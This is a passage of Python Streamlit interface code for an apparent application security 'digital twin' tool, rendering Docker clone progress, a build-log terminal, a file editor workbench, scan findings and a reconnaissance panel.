        "apk_path":  tmp.name,
        "report":    report,
        "workbench": workbench,
        "selected":  "AndroidManifest.xml",  # default open file
        "mode":      "apk",
    }
    st.rerun()


# ─────────────────────────────────────────────────────────────────────
#  CLONE PROGRESS PANEL
# ─────────────────────────────────────────────────────────────────────
_STEPS = [
    ("preflight",  "🐳", "Docker check", "Daemon reachable / auto-launching"),
    ("extracting", "📦", "Extracting",   "Unpacking ZIP, indexing files"),
    ("detect",     "🔍", "Detecting",    "Stack: PHP / Python / Node / HTML"),
    ("build",      "🏗️",  "Building",    "Dockerfile generated → docker build"),
    ("run",        "🚀", "Deploying",    "Container running on isolated network"),
]

# Stage names yielded by the worker map to these UI steps.
# v34-fix: DB twin worker yields different stage names — without these
# aliases the progress bar got stuck at "preflight 0%" because the
# stage was unrecognised and pct (which was correctly being set) was
# never reached by the step-index-based progress calculation.
_STAGE_ALIAS = {
    # source-clone aliases (existing)
    "dockerfile": "build",
    "ready":      "run",
    # DB-twin aliases (NEW v34-fix)
    "extract":    "extracting",   # DB stage "extract" → UI "extracting"
    # detect → already matches
    # build   → already matches
    # ready   → already aliased to run above
}

def _render_clone_progress(job: dict, has_err: bool) -> None:
    stage = job.get("stage", "preflight")
    pct   = job.get("pct", 0)
    msg   = job.get("msg", "")
    stage = _STAGE_ALIAS.get(stage, stage)

    # ── Deploy timer ──────────────────────────────────────────────
    deploy_start = st.session_state.get("dt_state", {}).get("deploy_start")
    if deploy_start:
        elapsed = time.time() - deploy_start
        if pct >= 96 and not has_err:
            # Store final time once so it doesn't keep counting
            if not st.session_state["dt_state"].get("deploy_elapsed"):
                st.session_state["dt_state"]["deploy_elapsed"] = elapsed
            elapsed = st.session_state["dt_state"]["deploy_elapsed"]
            timer_color, timer_icon = "#16A34A", "✓"
        elif has_err:
            timer_color, timer_icon = "#DC2626", "✗"
        else:
            timer_color, timer_icon = "#0284C7", "⏱"
        m, s = divmod(int(elapsed), 60)
        timer_str = f"{m}m {s:02d}s" if m else f"{s}s"
        st.markdown(
            f'<div style="font-family:JetBrains Mono,monospace;font-size:0.72rem;'
            f'color:{timer_color};text-align:right;margin-bottom:4px;letter-spacing:0.05em">'
            f'{timer_icon} Deploy time: <b>{timer_str}</b></div>',
            unsafe_allow_html=True,
        )

    order = [s[0] for s in _STEPS]
    # Where is the failure / current position?
    # - on error: find which step the worker was on (so user sees the ✗ correctly)
    # - on success: cur advances normally; pct≥96 → all done
    failed_idx = None
    if has_err:
        # Worker sets stage="error" on failure — recover the LAST stage that ran
        last_stage = job.get("last_stage") or stage
        last_stage = _STAGE_ALIAS.get(last_stage, last_stage)
        try:
            failed_idx = order.index(last_stage)
        except ValueError:
            failed_idx = 0   # default: blame preflight
        cur = failed_idx
    else:
        try:
            cur = order.index(stage)
        except ValueError:
            cur = len(order) if pct >= 96 else 0
        if pct >= 96:
            cur = len(order)

    o_col = RED if has_err else (GRN if pct >= 96 else RB)
    o_lbl = "FAILED" if has_err else ("DEPLOYED ✓" if pct >= 96 else "CLONING…")

    # ── OVERALL 1-100% PROGRESS BAR ───────────────────────────
    overall_pct = min(100, max(0, int(pct)))
    if pct >= 96 and not has_err:
        overall_pct = 100
    done_cls = "done" if overall_pct >= 100 else ""

    deploy_url = (job.get("result") or {}).get("url", "")
    if has_err:
        overall_msg = f'⚠ {job.get("error", "Unknown error")}'
    elif overall_pct >= 100:
        if deploy_url:
            overall_msg = (
                f'<span style="color:{GRN};font-weight:700">✓ Deployed successfully</span> · '
                f'<a href="{deploy_url}" target="_blank" '
                f'style="color:#0284C7;font-weight:700;text-decoration:none;'
                f'background:rgba(2,132,199,0.1);padding:3px 10px;border-radius:14px;">'
                f'Open app ↗ {deploy_url}</a>'
            )
        else:
            overall_msg = f'<span style="color:{GRN};font-weight:700">✓ Deployed successfully</span>'
    else:
        overall_msg = msg or f"Cloning in progress... {overall_pct}% complete"

    # flush-left HTML (NO indentation — indentation makes Streamlit render raw)
    st.markdown(
        '<div class="dt-overall">'
        '<div class="dt-overall-hdr">'
        f'<span class="dt-overall-lbl">🚀 Overall Progress · {stage.title()}</span>'
        f'<span class="dt-overall-pct {done_cls}">{overall_pct}%</span>'
        '</div>'
        '<div class="dt-overall-track">'
        f'<div class="dt-overall-fill {done_cls}" style="width:{overall_pct}%"></div>'
        '</div>'
        f'<div class="dt-overall-msg">{overall_msg}</div>'
        '</div>',
        unsafe_allow_html=True,
    )

    # Step rows — built flush-left so markdown never treats them as a code block
    rows = ""
    for i, (key, icon, lbl, desc) in enumerate(_STEPS):
        if has_err and failed_idx is not None and i == failed_idx:
            si, ico, bw, bc = "si-fail", "✗", "100%", "dt-bar-fail"
        elif i < cur:
            si, ico, bw, bc = "si-done", "✓", "100%", "dt-bar"
        elif i == cur and not has_err:
            si, ico = "si-active", icon
            bw, bc = f"{min(pct,95)}%", "dt-bar dt-bar-live"
        else:
            si, ico, bw, bc = "si-wait", icon, "0%", "dt-bar"
        rows += (
            '<div class="dt-step">'
            f'<div class="dt-si {si}">{ico}</div>'
            '<div class="dt-step-info">'
            f'<div class="dt-step-lbl">{lbl}</div>'
            f'<div class="dt-step-sub">{desc}</div>'
            '</div>'
            f'<div class="dt-bar-bg"><div class="{bc}" style="width:{bw}"></div></div>'
            '</div>'
        )

    err_html = (
        f'<span style="color:{RED}">⚠ {job.get("error","")}</span>'
        if has_err else
        f'<span style="color:{TXM}">{msg}</span>'
    )
    o_bg_color = {RED: "rgba(220,38,38,0.1)", GRN: "rgba(22,163,74,0.1)",
                  RB: "rgba(2,132,199,0.1)"}.get(o_col, "rgba(2,132,199,0.1)")
    docker_icon = _SECTION_ICONS["docker"]
    st.markdown(
        '<div class="dt-prog">'
        '<div class="dt-prog-hdr" style="margin-bottom:18px">'
        '<span style="width:32px;height:32px;background:linear-gradient(135deg,#E0F2FE,#BAE6FD);border-radius:8px;display:inline-flex;align-items:center;justify-content:center;color:#0284C7;box-shadow:0 2px 6px rgba(2,132,199,0.15)">' + docker_icon + '</span>'
        f'<span style="font-family:{SANS};font-size:0.95rem;font-weight:800;color:#0C4A6E;letter-spacing:0.01em">Docker Clone Pipeline</span>'
        f'<span style="margin-left:auto;font-family:{MONO};font-size:.7rem;font-weight:700;color:{o_col};background:{o_bg_color};border:1px solid {o_col}40;padding:5px 12px;border-radius:20px;letter-spacing:.08em">{o_lbl}</span>'
        '</div>'
        + rows +
        f'<div style="margin-top:12px;padding-top:12px;border-top:1px solid #F1F5F9;font-family:{MONO};font-size:.74rem;color:#475569">{err_html}</div>'
        '</div>',
        unsafe_allow_html=True,
    )

    # Live hacker terminal — auto-typing reveal of the real Docker build log.
    if job.get("build_log"):
        is_done = (pct >= 96 and not has_err)
        if is_done:
            with st.expander(f"💻 Live deploy terminal ({len(job['build_log'])} lines)", expanded=False):
                st.markdown(_build_hacker_terminal(job["build_log"], show_cursor=False),
                            unsafe_allow_html=True)
        else:
            st.markdown(_build_hacker_terminal(job["build_log"], show_cursor=True),
                        unsafe_allow_html=True)
    elif not has_err and pct < 96:
        # No build_log yet — Docker is pulling base image or starting first build.
        stage_now = job.get("stage", "preflight")
        is_building = stage_now == "build"
        badge = "BUILDING" if is_building else "WARMING UP"
        tip1 = ("pip/npm BuildKit cache active — packages cached after first install"
                if is_building else
                "downloading base image — only needed once, then it's cached")
        tip2 = ("next deploy: only changed layers rebuild — usually &lt; 15 s"
                if is_building else
                "pip install + npm install layers are cached per requirements.txt")
        st.markdown(
            '<div class="dt-hacker-term"><div class="dt-hacker-hdr">'
            '<div class="dots"><span class="r"></span><span class="y"></span><span class="g"></span></div>'
            f'<div class="title">aidtctm · {stage_now}</div>'
            f'<div class="badge">{badge}</div></div>'
            '<div class="dt-hacker-body">'
            '<div class="dt-hacker-line step" style="animation-delay:0ms">'
            '<span class="ln">  1</span><span class="pr">$</span>'
            '<span class="txt">docker buildkit enabled — parallel layer builds</span></div>'
            '<div class="dt-hacker-line ok"   style="animation-delay:120ms">'
            '<span class="ln">  2</span><span class="pr">✓</span>'
            '<span class="txt">requirements.txt copied first — pip layer cached</span></div>'
            '<div class="dt-hacker-line step" style="animation-delay:240ms">'
            '<span class="ln">  3</span><span class="pr">$</span>'
            f'<span class="txt">{tip1}</span></div>'
            '<div class="dt-hacker-line dim"  style="animation-delay:360ms">'
            '<span class="ln">  4</span><span class="pr">·</span>'
            f'<span class="txt">{tip2}</span></div>'
            '<div class="dt-hacker-line step" style="animation-delay:480ms">'
            '<span class="ln">  5</span><span class="pr">$</span>'
            f'<span class="txt">{msg or "processing…"}</span>'
            '<span class="dt-hacker-cursor"></span></div>'
            '</div></div>',
            unsafe_allow_html=True,
        )


def _build_hacker_terminal(build_log: list[str], show_cursor: bool) -> str:
    """Render the build log as a high-end live hacker terminal with typing reveal."""
    # Keep only the last N lines so the reveal stays snappy
    log = build_log[-60:]
    lines_html = ""
    for i, ln in enumerate(log, start=1):
        safe = (ln.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;"))
        # Classify line → colour class
        stripped = ln.lstrip()
        if "❌" in ln or "error" in ln.lower() or "failed" in ln.lower():
            cls = "err";   prompt = "✗"
        elif "Successfully" in ln or stripped.startswith("✓") or "Container started" in ln:
            cls = "ok";    prompt = "✓"
        elif stripped.startswith("Step ") and "/" in stripped[:10]:
            cls = "step";  prompt = "$"
        elif "--->" in ln or stripped.startswith("---"):
            cls = "layer"; prompt = "↳"
        elif stripped.startswith(("Stack detected", "Markers found", "Allocated", "Container")):
            cls = "step";  prompt = ">"
        else:
            cls = "dim";   prompt = "·"
        # Stagger the typing reveal — each line types in 60ms after the previous
        delay_ms = min(i, 24) * 60
        lines_html += (
            f'<div class="dt-hacker-line {cls}" style="animation-delay:{delay_ms}ms">'
            f'<span class="ln">{i:>3}</span>'
            f'<span class="pr">{prompt}</span>'
            f'<span class="txt">{safe}</span>'
            '</div>'
        )
    if show_cursor:
        lines_html += (
            '<div class="dt-hacker-line"><span class="ln">&nbsp;</span>'
            '<span class="pr">$</span>'
            '<span class="txt" style="color:#38BDF8">_</span>'
            '<span class="dt-hacker-cursor"></span></div>'
        )
    badge = "BUILDING…" if show_cursor else "DEPLOYED"
    return (
        '<div class="dt-hacker-term">'
        '<div class="dt-hacker-hdr">'
        '<div class="dots"><span class="r"></span><span class="y"></span><span class="g"></span></div>'
        '<div class="title">aidtctm · live deploy terminal</div>'
        f'<div class="badge">{badge}</div>'
        '</div>'
        f'<div class="dt-hacker-body">{lines_html}</div>'
        '</div>'
    )


# ─────────────────────────────────────────────────────────────────────
#  VS CODE WORKBENCH
# ─────────────────────────────────────────────────────────────────────
def _render_workbench(state: dict, job: dict) -> None:
    files       = state["files"]
    scan        = state["scan"]
    selected    = state.get("selected", "")
    edit_mode   = state.get("edit_mode", False)
    result      = state.get("clone_result") or job.get("result")

    # Honest threat accounting: only CRITICAL/HIGH severity count as "threats".
    # Everything else is a lint-level "observation" (a regex match), not a threat —
    # this stops a clean WordPress upload from reading as "90 threats".
    _SEV_THREAT = {"CRITICAL", "HIGH"}
    threat_names: set[str] = set()
    real_threats = 0
    total_observations = 0
    for r in scan.get("per_file", []):
        fmatch = False
        for fi in r.get("findings", []):
            total_observations += 1
            if str(fi.get("severity", "")).upper() in _SEV_THREAT:
                real_threats += 1
                fmatch = True
        if fmatch:
            threat_names.add(os.path.basename(r.get("file", "")))
    for fi in scan.get("deep", {}).get("findings", []):
        total_observations += 1
        if str(fi.get("severity", "")).upper() in _SEV_THREAT:
            real_threats += 1
            threat_names.add(os.path.basename(fi.get("file", "")))

    n_threats = real_threats
    viewable   = [f for f in files if f["ext"] in _CODE_EXTS]
    sel_file   = next((f for f in viewable if f["rel"] == selected), None)
    if not sel_file and viewable:
        sel_file = viewable[0]; state["selected"] = sel_file["rel"]

    st.markdown(_sec_header("workbench", "VS Code Workbench"), unsafe_allow_html=True)

    # KPI row
    fname_disp = state["filename"][:20] + "…" if len(state["filename"]) > 22 else state["filename"]
    _clone_port_str = str(result.get("host_port","")) if result else ""
    _clone_sec = st.session_state.get(f"sec_verdict_{_clone_port_str}", "")
    _clone_sec_badge = (
        ' <span style="background:#FEF2F2;border:1px solid #DC2626;border-radius:4px;'
        'padding:1px 7px;font-size:0.58rem;color:#DC2626;font-weight:700">🔴 VULNERABLE</span>'
        if _clone_sec == "VULNERABLE" else (
        ' <span style="background:#F0FDF4;border:1px solid #16A34A;border-radius:4px;'
        'padding:1px 7px;font-size:0.58rem;color:#16A34A;font-weight:700">🟢 SECURED</span>'
        if _clone_sec == "SECURED" else "")
    )
    clone_status = (
        f'<span class="dt-pro-badge live"><span class="dot"></span>LIVE :{result.get("host_port","?")}</span>'
        + _clone_sec_badge
        if result else
        f'<span class="dt-pro-badge warn"><span class="dot"></span>BUILDING</span>'
    )
    # Detected stack — honest signal that's actually useful (not a misleading
    # "threats found" count that mostly reflects pre-existing patterns in the
    # uploaded code).
    stack_label = "—"
    if result and result.get("stack"):
        sd = result["stack"]
        fw = sd.get("framework") or sd.get("language") or "?"
        port = sd.get("internal_port", "?")
        stack_label = f"{fw} :{port}"
    elif job.get("result", {}).get("stack"):
        sd = job["result"]["stack"]
        stack_label = f"{sd.get('framework','?')} :{sd.get('internal_port','?')}"

    threats_hint = (
        f'<span style="font-size:.6rem;color:#64748B">findings shown below</span>'
        if n_threats else
        f'<span style="font-size:.6rem;color:#16A34A">no critical issues</span>'
    )
    st.markdown(f"""
<div class="dt-kpis">
  <div class="dt-kpi">
    <div class="dt-kpi-val">{len(files)}</div>
    <div class="dt-kpi-lbl">Files Extracted</div>
  </div>
  <div class="dt-kpi">
    <div class="dt-kpi-val">{len(viewable)}</div>
    <div class="dt-kpi-lbl">Code Files</div>
  </div>
  <div class="dt-kpi">
    <div class="dt-kpi-val" style="font-size:.92rem;color:#0C4A6E;line-height:1.15">{stack_label}</div>
    <div class="dt-kpi-lbl">Stack · Port</div>
  </div>
  <div class="dt-kpi">
    <div class="dt-kpi-val" style="font-size:.85rem">{clone_status}</div>
    <div class="dt-kpi-lbl">Docker Clone</div>
  </div>
</div>""", unsafe_allow_html=True)

    # VS Code window title bar
    st.markdown(f"""
<div class="dt-wb-win">
  <div class="dt-wb-titlebar">
    <div class="dt-tl"><span class="r"></span><span class="y"></span><span class="g"></span></div>
    <div class="dt-wb-fname">{fname_disp} — Digital Twin Workbench · {len(files)} files</div>
  </div>
</div>""", unsafe_allow_html=True)

    # Two-column split: file tree | editor
    col_tree, col_editor = st.columns([1, 3], gap="small")

    with col_tree:
        _render_file_tree(files, viewable, state, threat_names)

    with col_editor:
        if sel_file:
            _render_editor(sel_file, scan, state, result)
        else:
            st.markdown(
                f'<div style="background:{VBG};border:1px solid #DBDBDB;'
                f'border-radius:8px;height:420px;display:flex;align-items:center;'
                f'justify-content:center;font-family:{MONO};color:{TXS};font-size:.85rem">'
                f'Select a file from the explorer →</div>',
                unsafe_allow_html=True,
            )

    # Deep scan summary (collapsible, shown if findings exist)
    deep = scan.get("deep", {})
    if deep.get("findings"):
        _render_deep_scan_summary(deep)


def _render_file_tree(
    files: list[dict],
    viewable: list[dict],
    state: dict,
    threat_names: set,
) -> None:
    selected = state.get("selected", "")

    # Group by directory
    dirs: dict[str, list] = {}
    for f in files:
        dirs.setdefault(f["dir"], []).append(f)

    viewable_rels = {f["rel"] for f in viewable}

    # Explorer header
    st.markdown(
        '<div class="dt-tree-hdr">'
        '<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"/></svg>'
        'Explorer · click to open</div>',
        unsafe_allow_html=True,
    )

    # Clickable file tree — inside a fixed-height scroll box so large projects
    # don't push the whole page down. Scrolls internally instead.
    n_files = len(files)
    tree_h = 300 if n_files <= 6 else (440 if n_files <= 14 else 560)
    tree_box = st.container(height=tree_h, border=False)
    with tree_box:
        for d in sorted(dirs.keys()):
            st.markdown(
                f'<div class="dt-tree-dir">'
                f'<svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="6,9 12,15 18,9"/></svg>'
                f'<svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="#0284C7" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"/></svg>'
                f'{d}/</div>',
                unsafe_allow_html=True,
            )
            for fi in sorted(dirs[d], key=lambda x: x["name"]):
                is_active = fi["rel"] == selected
                is_threat = fi["name"] in threat_names
                is_viewable = fi["rel"] in viewable_rels
                sz = f'{fi["size"]/1024:.1f}k' if fi["size"] > 1024 else f'{fi["size"]}b'
                threat_mark = " 🔴" if is_threat else ""
                label = f'{_icon(fi["ext"])} {fi["name"]}{threat_mark}  ·  {sz}'

                # Unique key — append "active" so CSS highlights the open file
                safe_rel = fi["rel"].replace("/", "_").replace(".", "_").replace(" ", "_")
                key = f"dttree_active_{safe_rel}" if is_active else f"dttree_{safe_rel}"

                if is_viewable:
                    if st.button(label, key=key, use_container_width=True):
                        state["selected"] = fi["rel"]
                        state["edit_mode"] = False
                        st.rerun()
                else:
                    # Non-viewable (binary) — show as disabled-looking row
                    st.markdown(
                        f'<div style="padding:8px 14px 8px 24px;font-family:{MONO};font-size:.74rem;'
                        f'color:#94A3B8;border-bottom:1px solid #F0F9FF;border-left:3px solid transparent;">'
                        f'{label}</div>',
                        unsafe_allow_html=True,
                    )


def _render_editor(sel: dict, scan: dict, state: dict, result: Optional[dict]) -> None:
    ext  = sel["ext"]
    name = sel["name"]
    edit = state.get("edit_mode", False)

    # Read file  — prefer Docker container if clone is live
    content = _read_file(sel, state, result)

    # Tab bar
    st.markdown(f"""
<div class="dt-tabs" style="border-radius:6px 6px 0 0;
     border:1px solid #DBDBDB;border-bottom:none">
  <div class="dt-tab dt-ton">
    {_icon(ext)}&nbsp;{name}
    {'&nbsp;<span style="color:#888;font-size:.6rem">✎</span>' if edit else ''}
  </div>
</div>""", unsafe_allow_html=True)

    # Action row
    ca, cb, cc, cd, _ = st.columns([1, .9, .9, 1.6, .5])
    with ca:
        new_edit = st.toggle("✏️ Edit", value=edit, key="dt_edit_tog")
        if new_edit != edit:
            state["edit_mode"] = new_edit; st.rerun()

    save_clicked = False
    if edit:
        with cb:
            save_clicked = st.button("💾 Save", key="dt_save", type="primary")

    with cc:
        st.markdown(
            f'<div style="font-family:{MONO};font-size:.67rem;color:{TXS};'
            f'padding-top:6px">{_lang(ext).upper()}</div>',
            unsafe_allow_html=True,
        )

    with cd:
        if result and result.get("container_name"):
            st.markdown(
                f'<div style="font-family:{MONO};font-size:.64rem;'
                f'color:{GRN};padding-top:6px">'
                f'🟢 Save → docker cp → container</div>',
                unsafe_allow_html=True,
            )
        else:
            st.markdown(
                f'<div style="font-family:{MONO};font-size:.64rem;'
                f'color:{AMB};padding-top:6px">🟡 Clone building…</div>',
                unsafe_allow_html=True,
            )

    # Editor body
    st.markdown(
        '<div style="border:1px solid #DBDBDB;border-top:none;'
        'border-radius:0 0 6px 6px;overflow:hidden">',
        unsafe_allow_html=True,
    )

    if edit:
        edited = st.text_area(
            "editor", value=content, height=430,
            key=f"dt_ed_{sel['rel']}", label_visibility="collapsed",
        )
        if save_clicked:
            _do_save(sel, edited, state, result)
    else:
        truncated = content[:9000] + ("\n…(truncated)" if len(content) > 9000 else "")
        st.code(truncated, language=_lang(ext), line_numbers=True)

    st.markdown("</div>", unsafe_allow_html=True)

    # Status bar
    lines   = content.count("\n") + 1
    src_lbl = (
        f"Docker · {result.get('container_name','')}"
        if result else "Local extract"
    )
    st.markdown(f"""
<div class="dt-statusbar" style="border-radius:0 0 8px 8px;margin-top:-4px">
  <span>Ln {lines} · {len(content.encode()):,} B · {_lang(ext).upper()}</span>
  <span>{src_lbl}</span>
  <span>UTF-8</span>
</div>""", unsafe_allow_html=True)

    # Security findings
    _render_file_findings(name, scan)


def _read_file(sel: dict, state: dict, result: Optional[dict]) -> str:
    """
    Read file content. If Docker clone is ready, read from container
    (so edits made inside Docker are also visible). Fall back to local.
    """
    if result and result.get("clone_id"):
        try:
            from core.source_clone import read_clone_file
            # list_clone_files returns paths like /var/www/html/index.php
            # read_clone_file wants that full path
            docker_files = state.get("_docker_file_map", {})
            if not docker_files:
                _refresh_docker_files(state, result)
                docker_files = state.get("_docker_file_map", {})
            docker_path = docker_files.get(sel["name"], "")
            if docker_path:
                c = read_clone_file(result["clone_id"], docker_path)
                if c and c != "Container not found":
                    return c
        except Exception:
            pass
    # Fallback: local disk
    try:
        return open(sel["path"], "r", errors="replace").read()
    except Exception as exc:
        return f"# Error reading file: {exc}"


def _refresh_docker_files(state: dict, result: dict) -> None:
    """Build a name→container_path mapping from list_clone_files."""
    try:
        from core.source_clone import list_clone_files
        docker_files = list_clone_files(result["clone_id"])
        mapping = {os.path.basename(f["path"]): f["path"] for f in docker_files}
        state["_docker_file_map"] = mapping
    except Exception:
        state["_docker_file_map"] = {}


def _do_save(sel: dict, content: str, state: dict, result: Optional[dict]) -> None:
    """
    Save to:
      1. Local workbench disk copy (always)
      2. Docker container via write_clone_file (if clone is live)
    """
    # 1. Local save
    try:
        with open(sel["path"], "w", encoding="utf-8") as fh:
            fh.write(content)
    except Exception as exc:
        st.error(f"Local save failed: {exc}")
        return

    # Track edited files for the "My edits" export
    state.setdefault("saved_edits", {})[sel["rel"]] = content

    # 2. Docker save (the real live-edit mechanism)
    docker_msg = ""
    if result and result.get("clone_id"):
        try:
            from core.source_clone import write_clone_file, list_clone_files
            # Get Docker path for this file
            docker_files = state.get("_docker_file_map", {})
            if not docker_files:
                _refresh_docker_files(state, result)
                docker_files = state.get("_docker_file_map", {})

            docker_path = docker_files.get(sel["name"], "")
            if docker_path:
                ok = write_clone_file(result["clone_id"], docker_path, content)
                if ok:
                    docker_msg = f" · ✅ Pushed to container `{result.get('container_name','')}` via docker cp"
                else:
                    docker_msg = " · ⚠ Container write failed (check Docker)"
            else:
                # File not found in Docker map — try sandbox path fallback
                from core.source_clone import SANDBOX_ROOT
                sandbox_path = str(SANDBOX_ROOT / result["clone_id"] / sel["rel"])
                os.makedirs(os.path.dirname(sandbox_path), exist_ok=True)
                with open(sandbox_path, "w", encoding="utf-8") as fh:
                    fh.write(content)
                docker_msg = f" · ✅ Saved to clone sandbox (container on volume)"
        except Exception as exc:
            docker_msg = f" · ⚠ Docker push error: {exc}"
    else:
        docker_msg = " · 🟡 Docker not yet live — saved locally"

    st.success(f"✅ `{sel['name']}` saved{docker_msg}")
    st.caption("🔄 Reload the live preview iframe to see the change.")


def _render_file_findings(name: str, scan: dict) -> None:
    """Show forensic findings for the currently open file."""
    findings = []
    for r in scan.get("per_file", []):
        if name in r.get("file", ""):
            findings.extend(r.get("findings", []))
    # Also from deep scan
    for fi in scan.get("deep", {}).get("findings", []):
        if name in fi.get("file", ""):
            findings.append(fi)

    if not findings:
        return

    st.markdown(
        f'<div style="margin-top:10px;font-family:{SANS};font-size:.74rem;'
        f'font-weight:700;color:{RED};text-transform:uppercase;'
        f'letter-spacing:.08em">⚠ {len(findings)} finding(s) in this file</div>',
        unsafe_allow_html=True,
    )
    for fi in findings[:8]:
        sev = fi.get("severity", "INFO")
        sc  = _SEV_COLOR.get(sev, TXS)
        st.markdown(
            f'<div class="dt-finding" '
            f'style="background:{sc}0d;border-color:{sc}30;border-left-color:{sc}">'
            f'<span style="font-family:{MONO};font-size:.61rem;font-weight:700;'
            f'color:{sc};background:{sc}18;padding:2px 7px;border-radius:4px">{sev}</span>'
            f' <b style="color:{TXD}">{fi.get("category", fi.get("rule",""))}</b>'
            f'<span style="color:{TXS};margin-left:8px">Line {fi.get("line","?")}</span>'
            f'<div style="color:{TXM};margin-top:4px;font-size:.8rem">'
            f'{fi.get("description", fi.get("detail",""))}</div>'
            f'</div>',
            unsafe_allow_html=True,
        )


def _render_deep_scan_summary(deep: dict) -> None:
    findings = deep.get("findings", [])
    by_sev   = deep.get("by_severity", {})
    with st.expander(
        f"🔬 Deep Code Scan — {len(findings)} findings across "
        f"{deep.get('files_scanned', 0)} files",
        expanded=False,
    ):
        cols = st.columns(4)
        for col, sev in zip(cols, ["CRITICAL", "HIGH", "MEDIUM", "LOW"]):
            n   = by_sev.get(sev, 0)
            col.markdown(
                f'<div class="dt-kpi">'
                f'<div class="dt-kpi-val" style="color:{_SEV_COLOR.get(sev, TXS)}">{n}</div>'
                f'<div class="dt-kpi-lbl">{sev}</div></div>',
                unsafe_allow_html=True,
            )
        for fi in findings[:20]:
            sev = fi.get("severity", "LOW")
            sc  = _SEV_COLOR.get(sev, TXS)
            st.markdown(
                f'<div class="dt-finding" '
                f'style="background:{sc}0d;border-color:{sc}30;border-left-color:{sc}">'
                f'<span style="font-family:{MONO};font-size:.6rem;font-weight:700;'
                f'color:{sc};background:{sc}18;padding:2px 6px;border-radius:4px">{sev}</span>'
                f' <code style="font-size:.75rem">{fi.get("file","")}</code>'
                f'<span style="color:{TXS};margin-left:6px">L{fi.get("line","?")}</span>'
                f'<div style="color:{TXM};font-size:.79rem;margin-top:3px">'
                f'{fi.get("description", fi.get("category",""))}</div>'
                f'</div>',
                unsafe_allow_html=True,
            )
        if len(findings) > 20:
            st.caption(f"…and {len(findings)-20} more findings in the forensic report.")


# ─────────────────────────────────────────────────────────────────────
#  LIVE PREVIEW IFRAME
# ─────────────────────────────────────────────────────────────────────
def _render_cinematic_twin(state: dict, result: dict) -> None:
    """
    🏎️ F1-style cinematic 3D telemetry view of the cloned application.
    Each route in the source becomes a corner on a glowing neon
    race-track. A 'racing line' car runs laps, lighting up each route
    as it passes. Real telemetry HUD shows speed, risk, corners, crits.
    """
    clone_id = result.get("clone_id", "")
    if not clone_id:
        return

    # Reuse the recon cache so we don't re-scan
    recon = state.get(f"adaptive_recon_{clone_id}")
    if recon is None:
        # Try to run recon fast (silent — no spinner since this is decorative)
        try:
            from core.source_clone import SANDBOX_ROOT
            from core.source_recon import reconnoiter
            sandbox = SANDBOX_ROOT / clone_id
            if sandbox.exists():
                recon = reconnoiter(sandbox, stack=result.get("stack", {}))
                state[f"adaptive_recon_{clone_id}"] = recon
        except Exception:
            recon = {}

    # Aggregate all attack logs from session state
    all_log = []
    all_mit_log = []
    for s in _LAB_SAMPLES:
        all_log.extend(state.get(f"lab_log_{s['key']}", []))
        all_mit_log.extend(state.get(f"mit_log_{s['key']}", []))

    # Build & render the Three.js HTML
    try:
        from core.cinematic_twin import build_cinematic_view
        html = build_cinematic_view(
            recon=recon or {},
            attack_log=all_log,
            mitigation_log=all_mit_log,
            result=result,
            title="Digital Twin · Telemetry Circuit",
        )
    except Exception as e:
        st.warning(f"Cinematic twin unavailable: {e}")
        return

    # Section header — collapsible so users can hide if they want screen space
    with st.expander(
        "☣ Cinematic Digital Twin — clone vs virus, live narrative",
        expanded=True,
    ):
        st.markdown(
            '<div style="font-family:Inter,sans-serif;font-size:0.74rem;'
            'color:#475569;margin-bottom:10px;line-height:1.55">'
            'Storybook view of the attack: 📁 <b>dark-navy folder</b> = your '
            'cloned project · 👾 <b>Pokémon-style virus</b> = the attack · '
            '<b>files inside</b> = your source code. State auto-derives from '
            'the attack log: <b>idle → approaching → attacking → '
            '<span style="color:#DC2626">INFECTED</span> / '
            '<span style="color:#16A34A">MITIGATED</span></b>. When mitigated '
            'the virus dies with X eyes ✖_✖ and the files are rescued.'
            '</div>',
            unsafe_allow_html=True,
        )
        components.html(html, height=500, scrolling=False)


def _render_adaptive_attack_suite(state: dict, result: dict) -> None:
    """
    v24 senior upgrade: scans the cloned source after deploy and proposes
    a tailored attack battery based on what was discovered. This is what
    differentiates AI-DTCTM from a generic 'run all attacks' tool.

    Flow:
      1. Run source recon (cached per clone_id)
      2. Generate attack proposals
      3. Render: exposure chips + risk score + proposal cards
    """
    from core.source_clone import SANDBOX_ROOT
    clone_id = result.get("clone_id", "")
    url      = result.get("url", "")
    stack    = result.get("stack", {}) or {}
    if not clone_id:
        return
    sandbox = SANDBOX_ROOT / clone_id
    if not sandbox.exists():
        return

    # ── Cache recon per clone (it's deterministic for the same files) ──
    cache_key = f"adaptive_recon_{clone_id}"
    recon = state.get(cache_key)
    if recon is None:
        try:
            from core.source_recon import reconnoiter
            with st.spinner("🔍 Reconnoitring source code…"):
                recon = reconnoiter(sandbox, stack=stack)
            state[cache_key] = recon
        except Exception as e:
            st.warning(f"Source recon failed: {e}")
            return

    if not recon or not recon.get("ok"):
        return

    try:
        from core.attack_blueprint import generate_proposals
        proposals = generate_proposals(recon, clone_url=url, stack=stack)
    except Exception as e:
        st.warning(f"Blueprint engine failed: {e}")
        proposals = []

    # ────────────────────────────────────────────────────────────────
    # SECTION HEADER (v25: repurposed from "Attack Suite" → honest
    # "Reconnaissance Report" — proposals had no runner and overlapped
    # with Live Malware Lab below.)
    # ────────────────────────────────────────────────────────────────
    st.markdown(_sec_header("attack", "Source Code Reconnaissance",
                              "v25 · attack-surface scan"),
                 unsafe_allow_html=True)

    # ── EXPOSURE PANEL — high-level recon summary ──
    risk = recon.get("risk_score", 0)
    chips = recon.get("exposure_chips", [])
    if risk >= 65:   r_color, r_label = "#DC2626", "HIGH ATTACK SURFACE"
    elif risk >= 35: r_color, r_label = "#F59E0B", "MODERATE SURFACE"
    else:            r_color, r_label = "#16A34A", "MINIMAL SURFACE"

    chip_html = ""
    for c in chips[:10]:
        chip_html += (
            f'<span style="display:inline-block;background:#FFFFFF;'
